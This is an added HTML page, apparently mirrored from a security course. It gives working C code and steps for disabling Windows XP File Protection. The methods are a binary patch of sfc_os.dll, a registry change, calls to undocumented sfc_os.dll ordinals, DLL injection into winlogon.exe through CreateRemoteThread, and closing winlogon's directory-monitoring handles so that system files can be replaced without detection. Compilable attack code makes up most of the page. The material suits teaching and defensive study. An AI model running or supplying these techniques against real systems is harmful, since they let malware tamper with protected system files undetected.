@@ -1,0 +1,430 @@
+<html xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+
+<!-- Mirrored from www.vijaymukhi.com/seccourse/june2606/winfileprot.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:43:17 GMT -->
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 9">
+<meta name=Originator content="Microsoft Word 9">
+<link rel=File-List href="winfileprot_files/filelist.html">
+<title>Windows File Protection</title>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>Vijay Mukhi</o:Author>
+  <o:Template>Normal</o:Template>
+  <o:LastAuthor>Vijay Mukhi</o:LastAuthor>
+  <o:Revision>2</o:Revision>
+  <o:TotalTime>44</o:TotalTime>
+  <o:Created>2006-06-26T12:05:00Z</o:Created>
+  <o:LastSaved>2006-06-26T12:05:00Z</o:LastSaved>
+  <o:Pages>5</o:Pages>
+  <o:Words>960</o:Words>
+  <o:Characters>5476</o:Characters>
+  <o:Company>VMCI</o:Company>
+  <o:Lines>45</o:Lines>
+  <o:Paragraphs>10</o:Paragraphs>
+  <o:CharactersWithSpaces>6724</o:CharactersWithSpaces>
+  <o:Version>9.2720</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]-->
+<style>
+<!--
+ /* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+-->
+</style>
+</head>
+
+<body lang=EN-US style='tab-interval:.5in'>
+
+<div class=Section1>
+
+<p class=MsoNormal>Windows File Protection</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>We take the file sfc_os.aaa and find the offset 0xece9 and
+the bytes there should be 0x33c040 which we nop to 90 90 90.<span
+style="mso-spacerun: yes">  </span>We copy this file over sfc_os.dll in
+windows/system32 and windows/system32/dllcache.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>We first search for a key called </p>
+
+<p class=MsoNormal>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+NT\CurrentVersion\Winlogon and within this we find a key called SFCDisable. We
+then double click on this key and change the value from 0 to 0xffffffd9.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>C:\windowsfileprotection</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>#include &quot;windows.h&quot;</p>
+
+<p class=MsoNormal>#include &lt;stdio.h&gt;</p>
+
+<p class=MsoNormal>typedef DWORD (WINAPI *tpfn)(DWORD dwUnknown0, PWCHAR
+pwszFile, DWORD dwUnknown1);</p>
+
+<p class=MsoNormal>HMODULE h;</p>
+
+<p class=MsoNormal>tpfn pfn;</p>
+
+<p class=MsoNormal>void main()</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>h=LoadLibrary(&quot;sfc_os.dll&quot;);</p>
+
+<p class=MsoNormal>pfn = (tpfn)GetProcAddress(h , (LPCSTR)5);</p>
+
+<p class=MsoNormal>pfn(0,L&quot;c:\\windows\\system32\\calc.exe&quot;,-1);</p>
+
+<p class=MsoNormal>DeleteFile(&quot;c:\\windows\\system32\\calc.exe&quot;);</p>
+
+<p class=MsoNormal>FreeLibrary(h);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>We get the address of unnamed ordinal 5 from sfc_os.dll and
+call it. The second parameter is the name of the file. We then delete calc.exe
+and it does not come back again.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>C:\pwdump2</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>z.bat</p>
+
+<p class=MsoNormal>del s.dll</p>
+
+<p class=MsoNormal>cl -c s.c</p>
+
+<p class=MsoNormal>link /dll s.obj user32.lib</p>
+
+<p class=MsoNormal>del p.exe</p>
+
+<p class=MsoNormal>del *.obj</p>
+
+<p class=MsoNormal>cl -c -W0 p.c </p>
+
+<p class=MsoNormal>link p.obj /out:p.exe<span style="mso-spacerun: yes"> 
+</span>user32.lib advapi32.lib</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>s.c</p>
+
+<p class=MsoNormal>#include &lt;windows.h&gt;</p>
+
+<p class=MsoNormal>typedef DWORD (WINAPI *tpfn)();</p>
+
+<p class=MsoNormal>int WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID
+lpvReserv)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>if ( fdwReason == DLL_PROCESS_ATTACH)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>char aa[100];</p>
+
+<p class=MsoNormal>HMODULE h;</p>
+
+<p class=MsoNormal>tpfn pfn;</p>
+
+<p class=MsoNormal>h=LoadLibrary(&quot;sfc_os.dll&quot;);</p>
+
+<p class=MsoNormal>pfn = (tpfn)GetProcAddress(h , (LPCSTR)2);</p>
+
+<p class=MsoNormal>pfn();</p>
+
+<p class=MsoNormal>//GetModuleFileName(0,aa,100);</p>
+
+<p class=MsoNormal>//MessageBox(0,aa,&quot;hi&quot;,0);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>return 1;</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>p.c</p>
+
+<p class=MsoNormal>#include &lt;windows.h&gt;</p>
+
+<p class=MsoNormal>HANDLE hpid,htok,hthread;</p>
+
+<p class=MsoNormal>DWORD i,pid;</p>
+
+<p class=MsoNormal>TOKEN_PRIVILEGES priv;</p>
+
+<p class=MsoNormal>void *p;</p>
+
+<p class=MsoNormal>void main (int argc, char *argv[])</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>pid = atoi (argv[1]);</p>
+
+<p class=MsoNormal>OpenProcessToken (-1,TOKEN_ADJUST_PRIVILEGES,&amp;htok); //
+-1 is the psedu value returned by GetCurrentProcess</p>
+
+<p class=MsoNormal>LookupPrivilegeValue (0,
+SE_DEBUG_NAME,&amp;priv.Privileges[0].Luid);<span style="mso-spacerun: yes"> 
+</span>//14</p>
+
+<p class=MsoNormal>priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;</p>
+
+<p class=MsoNormal>priv.PrivilegeCount = 1;</p>
+
+<p class=MsoNormal>AdjustTokenPrivileges(htok,FALSE,&amp;priv,0,0,0);</p>
+
+<p class=MsoNormal>hpid = OpenProcess(PROCESS_ALL_ACCESS,0,pid);</p>
+
+<p class=MsoNormal>p = VirtualAllocEx(hpid,0,50,MEM_COMMIT,PAGE_READWRITE);</p>
+
+<p class=MsoNormal>WriteProcessMemory(hpid,p,(void
+*)&quot;c:\\pwdump2\\s.dll&quot;,50,NULL);</p>
+
+<p class=MsoNormal>hthread =
+CreateRemoteThread(hpid,0,0,(LPTHREAD_START_ROUTINE)
+GetProcAddress(GetModuleHandle(&quot;kernel32&quot;),&quot;LoadLibraryA&quot;),p,
+0, &amp;i);</p>
+
+<p class=MsoNormal>WaitForSingleObject(hthread,INFINITE);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>p 1412</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>In p.c we pass the handle or process id of winlogon.exe
+which is always 1412 on my copy of XP. We want to load s.dll into the address
+space of winlogon using the createremotethread method. We run the method
+LoadLibrary in the remote process passing its<span style="mso-spacerun: yes"> 
+</span>address and also the address of p which is the string s.dll as a
+parameter. thus we run the method LoadLibrary in the process space of winlogin
+which in turn loads s.dll<span style="mso-spacerun: yes">  </span>In DllMain of
+s.dll we call method 2 which terminates the thread that checks for protected
+directory changes.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>a.c</p>
+
+<p class=MsoNormal>#include &lt;windows.h&gt;</p>
+
+<p class=MsoNormal>#include &lt;stdio.h&gt;</p>
+
+<p class=MsoNormal>typedef struct _UNICODE_STRING </p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>USHORT Length,MaximumLength;</p>
+
+<p class=MsoNormal>PWSTR<span style="mso-spacerun: yes">  </span>Buffer;</p>
+
+<p class=MsoNormal>} UNICODE_STRING;</p>
+
+<p class=MsoNormal>typedef UNICODE_STRING *PUNICODE_STRING;</p>
+
+<p class=MsoNormal>typedef struct HandleInfo</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>ULONG Pid;</p>
+
+<p class=MsoNormal>USHORT<span style="mso-spacerun: yes"> 
+</span>ObjectType,HandleValue;</p>
+
+<p class=MsoNormal>PVOID ObjectPointer;</p>
+
+<p class=MsoNormal>ULONG AccessMask;</p>
+
+<p class=MsoNormal>} HANDLEINFO, *PHANDLEINFO;</p>
+
+<p class=MsoNormal>typedef struct SystemHandleInfo </p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>ULONG nHandleEntries;</p>
+
+<p class=MsoNormal>HANDLEINFO HandleInfo[1];</p>
+
+<p class=MsoNormal>} SYSTEMHANDLEINFO, *PSYSTEMHANDLEINFO;</p>
+
+<p class=MsoNormal>long (NTAPI *pNtQuerySystemInformation)(int
+SystemInformationClass,PVOID SystemInformation,ULONG
+SystemInformationLength,PULONG ReturnLength);</p>
+
+<p class=MsoNormal>long (NTAPI *pNtQueryObject)(HANDLE ObjectHandle,int
+ObjectInformationClass,PVOID ObjectInformation,ULONG
+ObjectInformationLength,PULONG ReturnLength);</p>
+
+<p class=MsoNormal>TOKEN_PRIVILEGES tp,oldtp;</p>
+
+<p class=MsoNormal>HINSTANCE hNtDll;</p>
+
+<p class=MsoNormal>PSYSTEMHANDLEINFO pSystemHandleInfo;</p>
+
+<p class=MsoNormal>ULONG i, dwSize,dwPid;</p>
+
+<p class=MsoNormal>HANDLE hWinLogon,hCopy,hToken;</p>
+
+<p class=MsoNormal>struct </p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>UNICODE_STRING Name;</p>
+
+<p class=MsoNormal>WCHAR Buffer[MAX_PATH + 1]; </p>
+
+<p class=MsoNormal>}ObjName;</p>
+
+<p class=MsoNormal>void main()</p>
+
+<p class=MsoNormal>{ </p>
+
+<p class=MsoNormal>dwPid = 1416;</p>
+
+<p class=MsoNormal>hNtDll = LoadLibrary(&quot;ntdll.dll&quot;);</p>
+
+<p class=MsoNormal>pNtQuerySystemInformation=(long (NTAPI
+*)(int,PVOID,ULONG,PULONG))GetProcAddress(hNtDll,&quot;NtQuerySystemInformation&quot;);</p>
+
+<p class=MsoNormal>pNtQueryObject = (long (NTAPI *)(HANDLE,int, PVOID, ULONG,
+PULONG))GetProcAddress(hNtDll, &quot;NtQueryObject&quot;);</p>
+
+<p class=MsoNormal>OpenProcessToken((HANDLE)-1, TOKEN_QUERY |
+TOKEN_ADJUST_PRIVILEGES, &amp;hToken);</p>
+
+<p class=MsoNormal>LookupPrivilegeValue(NULL, SE_DEBUG_NAME,
+&amp;tp.Privileges[0].Luid);</p>
+
+<p class=MsoNormal>tp.PrivilegeCount = 1;</p>
+
+<p class=MsoNormal>tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;</p>
+
+<p class=MsoNormal>AdjustTokenPrivileges(hToken, FALSE, &amp;tp,
+sizeof(TOKEN_PRIVILEGES),&amp;oldtp, &amp;dwSize);</p>
+
+<p class=MsoNormal>hWinLogon = OpenProcess(PROCESS_DUP_HANDLE, 0, dwPid);</p>
+
+<p class=MsoNormal>pSystemHandleInfo = (PSYSTEMHANDLEINFO) VirtualAlloc(NULL,
+512000, MEM_COMMIT, PAGE_READWRITE);</p>
+
+<p class=MsoNormal>pNtQuerySystemInformation(16,pSystemHandleInfo, 512000,
+&amp;dwSize);</p>
+
+<p class=MsoNormal>for (i = 0; i &lt; pSystemHandleInfo-&gt;nHandleEntries;
+i++)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>if (pSystemHandleInfo-&gt;HandleInfo[i].Pid == dwPid)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>DuplicateHandle(hWinLogon,(HANDLE)pSystemHandleInfo-&gt;HandleInfo[i].HandleValue,(HANDLE)-1,&amp;hCopy,0,FALSE,DUPLICATE_SAME_ACCESS);</p>
+
+<p class=MsoNormal>pNtQueryObject(hCopy, 1, &amp;ObjName, sizeof
+(ObjName),NULL);</p>
+
+<p class=MsoNormal>if ( CompareStringW(0, NORM_IGNORECASE,ObjName.Buffer, -1,
+L&quot;\\DEVICE\\HARDDISKVOLUME1\\WINDOWS\\SYSTEM32&quot;, -1) == CSTR_EQUAL)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>printf(&quot;%S\n&quot;,ObjName.Buffer);</p>
+
+<p class=MsoNormal>CloseHandle(hCopy);</p>
+
+<p class=MsoNormal>DuplicateHandle (hWinLogon,(HANDLE)
+pSystemHandleInfo-&gt;HandleInfo[i].HandleValue,GetCurrentProcess(),
+&amp;hCopy, 0, FALSE,DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);</p>
+
+<p class=MsoNormal>CloseHandle(hCopy);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>cl a.c advapi32.lib</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The above program closes all handles that Winlogon has
+opened for the Windows/system32 directory. We first use the
+NtQuerySystemInformation function to get at all the handles created by all the
+processes. The number 16 gives us this information. The nHandleEntries member
+gives us the number of handles and we first choose the handles owned by
+Winlogon. This program normally has a pid of 1408, 1412 or 1416 and hence set
+variable dwpid accordingly. Once we have the handle owned by<span
+style="mso-spacerun: yes">  </span>y WinLogon we now need the name of the
+handle which we get by the function NtQueryObject where 1 means object name.
+These names are in Unicode and hence we use the Unicode string methods. The
+Duplicate is needed always as we are in one process and we cannot work with
+handles of another process unless we Duplicate the handle in our process. Adds
+more code. Thus the first duplicate handle is for getting the name of the
+handle, the second for closing it. Thus we use the extra hash define for
+permission DUPLICATE_CLOSE_SOURCE or else we cannot close it. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>We run the program and then delete calc.exe for
+windows\system32. As the directory change notifications handles have been
+removed, the WFP will never be notified of any changes in the files and hence
+windows thinks that no file in windows\system32 has been changed even though we
+have.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+</div>
+
+</body>
+
+
+<!-- Mirrored from www.vijaymukhi.com/seccourse/june2606/winfileprot.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:43:18 GMT -->
+</html>
